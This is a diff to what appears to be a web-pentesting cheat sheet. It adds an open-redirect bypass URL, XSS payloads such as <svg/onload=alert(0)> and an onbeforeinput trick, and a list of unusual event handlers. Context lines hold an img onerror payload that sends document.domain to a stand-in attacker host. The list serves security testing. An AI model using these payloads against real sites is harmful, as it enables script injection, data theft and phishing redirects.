@@ -849,6 +849,7 @@ Some applications block input containing hostnames like `127.0.0.1` and localhos
 - https://attacker.com/.victim.com
 - https://subdomain.victim.com/r/redir?url=https%3A%2F%2Fvictim.com%40ATTACKER_WEBSITE.COM?x=subdomain.victim.com%2f
 - https://www.victim.com/redir/r.php?redirectUri=https://evilsite%E3%80%82com%23.victim.com/
+- https://www.victim.com/redir/r.php?redirectUri=/%0d/evilsite.com/
 
 
 
@@ -1018,14 +1019,19 @@ Manually testing for XXE vulnerabilities generally involves
   - ```HTML
     <img src=x onerror=this.src='http://ATTACKER-WEBSITE/?'+document.domain;>
     ```
- - onbeforeinput + contenteditable
-   ```JavaScript
-   %22%20onbeforeinput=alert(document.domain)%20contenteditable%20alt=%22
-   ```
- - ```JavaScript
-   1672&81782%26apos%3b%3balert(%26apos%3bXSS%26apos%3b)%2f%2f232=1
-   ```
-
+- onbeforeinput + contenteditable
+  ```JavaScript
+  %22%20onbeforeinput=alert(document.domain)%20contenteditable%20alt=%22
+  ```
+- ```JavaScript
+  1672&81782%26apos%3b%3balert(%26apos%3bXSS%26apos%3b)%2f%2f232=1
+  ```
+- ```HTML
+  <svg/onload=alert(0)>
+  ```
+- Unusual events: 
+  - `onpointerrawupdate=` (Chrome only)
+  - `onmouseleave=`
 
 
 ### <ins>Cross-site request forgery (CSRF)</ins>
